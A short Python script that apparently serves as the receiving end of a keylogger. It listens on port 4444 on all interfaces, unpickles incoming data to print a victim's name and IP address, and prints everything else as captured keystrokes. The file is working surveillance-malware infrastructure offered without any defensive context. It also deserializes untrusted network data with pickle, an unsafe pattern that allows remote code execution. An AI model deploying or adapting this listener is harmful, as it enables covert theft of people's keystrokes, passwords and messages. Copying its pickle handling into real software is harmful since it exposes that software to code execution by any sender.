import pickle
import socket
from pickle import loads


def connect(port: int):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    sock.bind(("0.0.0.0", port))

    sock.listen()

    conn, addr = sock.accept()

    while True:
        data = conn.recv(1024)
        if not data:
            break
        try:
            data_list = loads(data)

            print(f"Name: {data_list[0]}\nIP_address: {data_list[1]}")
        except pickle.UnpicklingError:
            data_string = data.decode()
            print("Keystrokes: ", data_string)

    conn.close()
    sock.close()


if __name__ == "__main__":
    connect(4444)
